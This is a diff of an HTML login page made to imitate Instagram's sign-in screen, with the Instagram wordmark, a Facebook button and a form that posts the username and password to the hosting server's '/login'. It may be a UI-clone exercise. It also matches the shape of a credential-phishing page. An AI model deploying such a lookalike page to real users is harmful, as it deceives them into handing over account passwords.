@@ -4,45 +4,80 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
     }
 
     body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #fafafa;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
+      color: #262626;
+      margin: 0;
+      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
 
     .container {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
       width: 100%;
       max-width: 350px;
       padding: 20px;
-    }
-
-    .login-box {
-      background-color: #fff;
-      border: 1px solid #dbdbdb;
-      width: 100%;
-      padding: 40px 30px;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
-    .login-box img.logo {
-      width: 175px;
+    .logo-text {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 48px;
+      color: #262626;
       margin-bottom: 30px;
+    }
+
+    .btn-facebook {
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 15px;
+      cursor: pointer;
+    }
+
+    .btn-facebook img {
+      width: 18px;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      margin: 15px 0;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .separator span {
+      color: #8e8e8e;
+      margin: 0 10px;
+      font-size: 13px;
     }
 
     form {
@@ -57,83 +92,89 @@
       border: 1px solid #dbdbdb;
       padding: 10px;
       margin-bottom: 10px;
+      border-radius: 5px;
       font-size: 14px;
-      border-radius: 3px;
     }
 
     input[type="submit"] {
       background-color: #0095f6;
-      border: none;
       color: white;
+      border: none;
       padding: 10px;
       font-weight: bold;
-      border-radius: 8px;
+      font-size: 14px;
+      border-radius: 6px;
+      margin-top: 10px;
       cursor: pointer;
-      font-size: 14px;
-      margin-top: 10px;
     }
 
-    .separator {
-      display: flex;
-      align-items: center;
-      margin: 20px 0;
-    }
-
-    .separator::before,
-    .separator::after {
-      content: "";
-      flex: 1;
-      height: 1px;
-      background-color: #dbdbdb;
-    }
-
-    .separator span {
-      margin: 0 10px;
-      color: #8e8e8e;
+    .forgot-password {
+      text-align: right;
       font-size: 13px;
+      color: #00376b;
+      margin: 5px 0 10px;
+      cursor: pointer;
     }
 
-    .signup-box {
-      background-color: #fff;
-      border: 1px solid #dbdbdb;
-      width: 100%;
-      padding: 20px 30px;
-      text-align: center;
+    .signup {
+      margin-top: 20px;
       font-size: 14px;
-      margin-top: 10px;
     }
 
-    .signup-box a {
+    .signup a {
       color: #0095f6;
       text-decoration: none;
       font-weight: bold;
     }
 
-    @media (max-width: 600px) {
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #999;
+      margin-top: 20px;
+      line-height: 1.4;
+    }
+
+    @media (max-width: 500px) {
+      body {
+        padding: 10px;
+      }
+
       .container {
         padding: 10px;
       }
 
-      .login-box, .signup-box {
-        padding: 20px 15px;
+      .logo-text {
+        font-size: 42px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="login-box">
-      <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" />
-      <form method="POST" action="/login">
-        <input type="text" name="username" placeholder="Phone number, username or email" required />
-        <input type="password" name="password" placeholder="Password" required />
-        <input type="submit" value="Log In" />
-      </form>
-      <div class="separator"><span>OR</span></div>
-      <div style="font-size: 13px; color: #385185; font-weight: 500; cursor: pointer;">Log in with Facebook</div>
-    </div>
-    <div class="signup-box">
+    <div class="logo-text">Instagram</div>
+
+    <button class="btn-facebook">
+      <img src="https://www.svgrepo.com/show/452196/facebook-1.svg" alt="Facebook icon" />
+      Continue with Facebook
+    </button>
+
+    <div class="separator"><span>OR</span></div>
+
+    <form method="POST" action="/login">
+      <input type="text" name="username" placeholder="Phone number, username or email address" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <div class="forgot-password">Forgotten your password?</div>
+      <input type="submit" value="Log in" />
+    </form>
+
+    <div class="signup">
       Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="footer">
+      By continuing, you agree to Instagram's<br />
+      <a href="#" style="color:#999;">Terms of Use</a> and <a href="#" style="color:#999;">Privacy Policy</a>.
     </div>
   </div>
 </body>
